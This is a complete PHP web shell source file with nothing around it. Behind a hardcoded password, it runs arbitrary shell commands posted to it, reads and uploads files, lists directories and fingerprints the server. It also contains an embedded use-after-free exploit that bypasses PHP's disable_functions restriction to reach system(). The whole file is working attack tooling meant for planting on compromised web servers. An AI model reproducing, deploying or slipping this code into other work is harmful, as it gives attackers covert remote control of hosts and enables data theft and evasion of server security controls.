<?php

error_reporting(0);

$password = "12345";
$get_password = $_POST["password"];
$cmd = $_POST["cmd"];
$aksi = $_POST["aksi"];

function exe($cmd){
    if(function_exists('system')){
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }elseif(function_exists('exec')){
        @exec($cmd,$results);
        $buff = "";
        foreach($results as $result){
            $buff .= $result;
        } return $buff;
    }elseif(function_exists('passthru')){
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }elseif(function_exists('shell_exec')){
        $buff = @shell_exec($cmd);
        return $buff;
    }
}

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}

function perms($file){
	$perms = fileperms($file);
	if(($perms & 0xC000) == 0xC000){
		// Socket
		$info = 's';
	}elseif(($perms & 0xA000) == 0xA000){
		// Symbolic Link
		$info = 'l';
	}elseif(($perms & 0x8000) == 0x8000){
		// Regular
		$info = '-';
	}elseif(($perms & 0x6000) == 0x6000){
		// Block special
		$info = 'b';
	}elseif(($perms & 0x4000) == 0x4000){
		// Directory
		$info = 'd';
	}elseif(($perms & 0x2000) == 0x2000){
		// Character special
		$info = 'c';
	}elseif(($perms & 0x1000) == 0x1000){
		// FIFO pipe
		$info = 'p';
	}else{
		// Unknown
		$info = 'u';
	}
	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x') :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x') :
	(($perms & 0x0400) ? 'S' : '-'));
		
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x') :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function formatSize($bytes){
	$types = array('B', 'KB', 'MB', 'GB', 'TB');
	for($i = 0; $bytes >= 1024 && $i < (count($types) -1); $bytes /= 1024, $i++);
	return(round($bytes, 2)." ".$types[$i]);
}

if($password === $get_password)
{ 
  if(isset($cmd))
  {
	if(isset($_POST['dir']))
	{
		$dir = $_POST['dir'];
		chdir($dir);
	} 
	else
	{
		$dir = getcwd();
    }
    
    if($aksi == "info")
    {
        header('Content-Type: text/plain');
        
        $os = php_uname();
        $ip = getHostByName(getHostName());
        $ver = phpversion();
        $sof = $_SERVER['SERVER_SOFTWARE'];
        $mail = (function_exists('mail')) ? "ON" : "OFF";
        $county_name = file_get_contents("https://ipapi.co/".$ip."/country_name");
        $ds = @ini_get("disable_functions");
        $show_ds = (!empty($ds)) ? $ds : "NONE";
        $county_name = ($county_name == "Undefined") ? "Not Found"  : $county_name;
        
        if(function_exists('mysql_get_client_info'))
        {
            $db = "MySql (".mysql_get_client_info().")";
        }
        elseif(function_exists('mssql_connect'))
        {
	        $db = "MSSQL";
        }
        elseif(function_exists('oci_connect'))
        {
	        $db = "Oracle";
        }
        elseif(function_exists('pg_connect'))
        {
	        $db = "PostgreSQL";
        }
        else
        {
	        $db = "None";
        }


        echo "\n";
        echo "PHP Version\t\t: ". $ver . "\n"; 
        echo "IP Server\t\t: ". $ip . " ( ".$county_name." ) \n";
        echo "Database\t\t: ".$db."\n";
        echo "Mailer\t\t\t: ".$mail."\n";
        echo "Disable Function\t: ".$show_ds."\n";
        echo "Software\t\t: ". $sof . "\n";
        echo "Operating system\t: ". $os . "\n";
       
    }
    else if($aksi == "download")
    {
        header('Content-Type: text/plain');
        $file = $_POST["file"];
        if($cek = file_get_contents($file))
        {
            echo $cek;
        }
        else
        {
            echo "False";
        }
    }
    else if($aksi == "upload")
    {
        header('Content-Type: text/plain');

        $dir = $_POST['dir'];
        $name = $_POST['name'];
        $context = $_FILES['file']['tmp_name'];
        $target_file = $dir. '/'.$name;

        if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file))
        {
            echo "success";
        }
        else
        {
            echo "error";
        }

    }
    else if($aksi == "show_subdo")
    {
        header('Content-Type: text/plain');

        $web = $_SERVER['HTTP_HOST'];
        $web = str_replace('www.','',$web);
        
        // count and scan subdomain by RED_HAWK
        $urlsd      = "http://api.hackertarget.com/hostsearch/?q=" . $web;
        $resultsd   = file_get_contents($urlsd);
        $subdomains = trim($resultsd, "\n");
        $subdomains = explode("\n", $subdomains);
        unset($subdomains['0']);
        $sdcount = count($subdomains);

        echo "[i] Total Subdomains Found : ". $sdcount . "\n\n";

        foreach ($subdomains as $subdomain)
        {
          echo "[+] Subdomain: " . (str_replace(",", "\n[-] IP: ", $subdomain));
          echo "\n\n";
        }
    }
    else if($aksi == "show_dirfile")
    {
        $folder = array();
        $files = array();
        $dir = $_POST['dir'];
        
        $scandir = scandir($dir);
        
        foreach($scandir as $pat){
            $dtime = date("d/m/y G:i", filemtime("$dir/$pat"));
            $is_ijo = is_writable($dir."/".$pat);
            $size = "--";

            if(function_exists('posix_getpwuid')) {
                $downer = @posix_getpwuid(fileowner("$dir/$pat"));
                $downer = $downer['name'];
            } else {
                //$downer = $uid;
                $downer = fileowner("$dir/$pat");
            }

            if(function_exists('posix_getgrgid')) {
                $dgrp = @posix_getgrgid(filegroup("$dir/$pat"));
                $dgrp = $dgrp['name'];
            } else {
                $dgrp = filegroup("$dir/$pat");
            }

            if($is_ijo)
            {
                $cek_perms = perms($dir.'/'.$pat);
                $status = "green";
            }
            else
            {
                $cek_perms = perms($dir.'/'.$pat);
                $status = "red";
            }

            if(!is_dir($dir.'/'.$pat) || $pat == "." || $pat == "..") continue;

            $folder[] = array(
                "nama_folder" => $pat,
                "size" => $size,
                "Last_Modified" => $dtime,
                "Permission" => $cek_perms,
                "status" => $status,
                "og" => $downer."/".$dgrp
            );

                
        }
        foreach ($scandir as $file) {
            $dtime = date("d/m/y G:i", filemtime($dir."/".$file));
            $is_ijo = is_writable($dir."/".$file);
            $size = filesize($dir."/".$file);

            if(function_exists('posix_getpwuid')) {
                $downer = @posix_getpwuid(fileowner("$dir/$file"));
                $downer = $downer['name'];
            } else {
                //$downer = $uid;
                $downer = fileowner("$dir/$file");
            }

            if(function_exists('posix_getgrgid')) {
                $dgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $dgrp = $dgrp['name'];
            } else {
                $dgrp = filegroup("$dir/$file");
            }

            if($is_ijo)
            {
                $cek_perms = perms($dir.'/'.$file);
                $status = "green";
            }
            else
            {
                $cek_perms = perms($dir.'/'.$file);
                $status = "red";
            }

            if(!is_file($dir.'/'.$file)) continue;
            
            $files[] = array(
                "nama_file" => $file,
                "size" => formatSize($size),
                "Last_Modified" => $dtime,
                "Permission" => $cek_perms,
                "status" => $status,
                "og" => $downer."/".$dgrp
            );
        }

        $semua = array(
            "folder" => $folder,
            "file" => $files,
        );

        echo json_encode($semua);
        
    }
    else
    {
        $show_ds = (!empty($ds)) ? $ds : "NONE";
        if($show_ds == "NONE")
        {
            echo trim(exe($cmd));
        }
        else
        {
            echo trim(pwn($cmd));
        } 
    }
	
  }
  else
  {
	echo "true";
  }
}
else
{
	echo "false";
}
